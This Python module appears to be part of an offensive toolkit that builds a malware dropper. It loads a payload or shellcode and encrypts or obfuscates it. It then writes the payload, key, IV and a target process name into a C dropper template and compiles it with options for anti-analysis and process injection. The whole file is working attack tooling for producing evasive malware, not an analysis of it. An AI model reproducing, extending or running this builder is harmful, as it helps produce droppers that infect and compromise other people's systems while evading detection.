import os
import subprocess
import tempfile
import shutil

from datetime import datetime
from .shellcode_generator import generate_shellcode


DROPPER_CORE_PATH = '../dropper_core/'
OUTPUT_FILE = '../outputs/dropper.exe'

def copy_project_to_temp():
    # Create a unique temporary directory
    temp_dir = tempfile.mkdtemp()

    # Path to the original project folder
    project_core_path = os.path.abspath(DROPPER_CORE_PATH)

    # Check if the project_core folder exists
    if not os.path.exists(project_core_path):
        print(f"Error: The directory '{project_core_path}' does not exist.")
        return None

    # Copy the contents of the project_core folder to the temporary directory
    try:
        shutil.copytree(project_core_path, temp_dir, dirs_exist_ok=True)
        print(f"Project core successfully copied to {temp_dir}")
        return temp_dir
    except Exception as e:
        print(f"Error while copying the folder: {e}")
        return None

def replace_placeholders(file_path, replacements):
    with open(file_path, 'r') as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        for placeholder, value in replacements.items():
            if placeholder in line:
                lines[i] = line.replace(placeholder, value)
                break

    with open(file_path, 'w') as file:
        file.writelines(lines)
        
def exe_to_shellcode(exe_path):
    with open(exe_path, 'rb') as f:
        exe_data = f.read()
        
    shellcode = ''.join(f'0x{byte:02x}' for byte in exe_data)
    return shellcode


def extract_shellcode(shellcode_path):
    if shellcode_path.endswith('.exe'):
        shellcode = exe_to_shellcode(shellcode_path)
    else:
        with open(shellcode_path, 'rb') as f:
            shellcode = f.read()
    
    return shellcode

def format_shellcode(shellcode):
    # Convert the byte string to a list of integers
    byte_list = list(shellcode)

    # Format the list of integers into C-style array syntax
    formatted_shellcode = "unsigned char Payload[] = {\n\t"
    for i in range(0, len(byte_list), 24):
        line = ", ".join(f"0x{byte:02X}" for byte in byte_list[i:i+24])
        formatted_shellcode += line + ",\n\t"
    formatted_shellcode = formatted_shellcode.rstrip(",\n\t") + "\n};"

    return formatted_shellcode

def delete_file_or_directory(path):
    """
    Deletes a file or directory at the specified path.

    :param path: The path to the file or directory to be deleted.
    """
    if not os.path.exists(path):
        print(f"The path '{path}' does not exist.")
        return

    if os.path.isfile(path):
        try:
            os.remove(path)
            print(f"File '{path}' has been deleted.")
        except Exception as e:
            print(f"Error deleting file '{path}': {e}")
    elif os.path.isdir(path):
        try:
            shutil.rmtree(path)
            print(f"Directory '{path}' has been deleted.")
        except Exception as e:
            print(f"Error deleting directory '{path}': {e}")
    else:
        print(f"The path '{path}' is neither a file nor a directory.")
    

def build_dropper(**kwargs):
    """Builds a dropper by copying project files, generating shellcode, replacing placeholders, and running Makefile."""
    print('🔨 Compiling Dropper...')
    
    # Extract known parameters with default values
    out_filename = kwargs.get("out_filename")
    shellcode_path = kwargs.get("shellcode_path")
    
    encryption_or_obfuscation_algorithm = kwargs.get("encryption_or_obfuscation", "")
    anti_analysis = kwargs.get("anti_analysis", False)
    injection_method = kwargs.get("injection_method", "")

    # Step 1: Copy the project to a temporary directory
    temp_dir = copy_project_to_temp()

    # Step 2: Generate obfuscated shellcode
    shellcode = extract_shellcode(shellcode_path)
    shellcode, enc_key, iv = generate_shellcode(shellcode, algorithm=encryption_or_obfuscation_algorithm.split(' ')[0])
    
    # Step 3: Replace placeholders in dropper.c
    placehodlers = {"/* SHELLCODE */": format_shellcode(shellcode)}
    if enc_key:
        placehodlers["/* KEY */"] = f"unsigned char key [] = {{\n\t{enc_key}\n}};"
    if iv:
        placehodlers["/* IV */"] = f"unsigned char iv [] = {{\n\t{iv}\n}};"
    if kwargs.get("process_name"):
        placehodlers["/* PROCESS_NAME */"] = f"L\"{kwargs.get('process_name')}\""
    
    dropper_source_path = os.path.join(temp_dir, "dropper.c")
    replace_placeholders(dropper_source_path, placehodlers)    
    
    # Step 4: Prepare shellcode argument
    shellcode_arg = shellcode_path if shellcode_path else kwargs.get('shellcode_text', '')

    # Step 5: Convert other kwargs into uppercase and remove spaces
    formatted_args = [
        f"{key.replace(' ', '_').upper()}={str(value).replace(' ', '_').replace('~', 'IN').split('_(')[0].upper()}"
        for key, value in kwargs.items() if value
    ]

    # Step 6: Construct the Make command
    command = ["make", "-f", "./Makefile"] + formatted_args + [
        f"SHELLCODE={shellcode_arg.replace('~', 'IN')}",
        f"OUTPUT_FILE={out_filename.replace('~', 'IN')}"
    ]

    print("🔹 Running command:", " ".join(command))  # Debugging output
    
    # Step 7: Run the make command with error handling
    try:
        subprocess.run(command, check=True, cwd=temp_dir, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        print("✅ Compilation done successfully.")
    except subprocess.CalledProcessError as e:
        print(f"❌ Compilation failed: {e}")
        print(f"#### Error Details ####")
        print(f"### Command:\n{command}\n")
        print(f"### stdout:\n{e.stdout}\n")
        print(f"### stderr:\n{e.stderr}\n")
        
    # Step 8: Move the output file to the specified output directory
    src = os.path.join(temp_dir, "bin", out_filename)
    dst_dir = "./dropper_outputs/"
    dst = os.path.join(dst_dir, out_filename)
    
    if os.path.exists(dst):
        base, ext = os.path.splitext(out_filename)
        new_filename = f"{base}_{datetime.now().strftime("%d_%m_%Y-%H_%M_%S")}{ext}"
        dst = os.path.join(dst_dir, new_filename)
    
    try:
        shutil.move(src, dst)
        print("✅ Output file moved successfully.")
    except Exception as e:
        print(f"❌ Failed to move output file: {e}")
        
    # Step 9: Clean up the temporary directory
    #delete_file_or_directory(shellcode_path)
    #delete_file_or_directory(temp_dir)
